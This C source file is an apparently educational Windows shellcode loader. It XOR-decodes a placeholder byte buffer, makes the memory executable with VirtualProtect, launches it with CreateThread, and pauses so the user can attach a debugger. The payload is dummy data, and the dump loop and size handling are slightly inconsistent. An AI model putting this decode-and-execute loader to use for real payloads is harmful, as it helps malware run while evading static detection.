#include <Windows.h>
#include <stdio.h>
#include <conio.h>
#include "xordecoder.h"

// -------------------------------------------------------------------
// Example placeholder encoded data
// -------------------------------------------------------------------
unsigned char encodedShellcode[] = {
    0x12, 0x34, 0x56, 0x78,
    0x9A, 0xBC, 0xDE, 0xF0
};

unsigned char xorKey[] = {
    0xAA, 0xBB, 0xCC, 0xDD
};


// Utility function
void WaitForKey(const char* msg)
{
    printf("%s\n", msg);
    printf("Press any key to continue...\n");
    _getch();
    printf("\n");
}

int main() 
{
	DWORD oldprotect = 0;
    printf("[*] Demo Runner with Step-by-Step Pausing\n\n");

    WaitForKey("[1] Starting setup");

    printf("[*] XOR key size: %zu bytes\n", sizeof(xorKey));
    printf("[*] Encoded buffer size: %zu bytes\n\n", sizeof(encodedShellcode));

    WaitForKey("[2] Ready to decode buffer: Press Any Key to Continue");

    unsigned char *decoded =
        decode_shellcode(encodedShellcode,
                         sizeof(encodedShellcode),
                         xorKey,
                         sizeof(xorKey));

    if (!decoded) {
        printf("[!] Decode failed\n");
        return -1;
    }

    printf("[*] Decode successful!\n");
    printf("[*] Memory allocated at: %p\n\n", decoded);

    WaitForKey("[3] Dumping first decoded bytes:  Press Any Key to Continue");

    printf("[*] First decoded bytes:\n    ");
    for (int i = 0; i < 16 && i < sizeof(encodedShellcode); i++) {
        printf("%02X ", decoded[i]);
    }
    printf("\n\n");

    BOOL result = VirtualProtect(decoded, SHELLCODE_SIZE, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!result) {
        printf("VirtualProtect Failed:%p %lu\n", decoded, GetLastError());
        return 1;
    }

    HANDLE threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)decoded, NULL, 0, NULL);
    if (threadHandle == NULL) {
        printf("CreateThread Failed:%p %lu\n", decoded, GetLastError());
        return 1;
    } else {
        printf("Shellcode Running: Attach to process with x32dbg and jump to %p\n", decoded);
        getchar();
        // do NOT return here — let cleanup run
    }

    getchar();
    SecureZeroMemory(decoded, sizeof(encodedShellcode));

    WaitForKey("[5] Cleanup complete — exiting:  Press Any Key to Continue");

    printf("[*] Finished.\n");
    return 0;
}
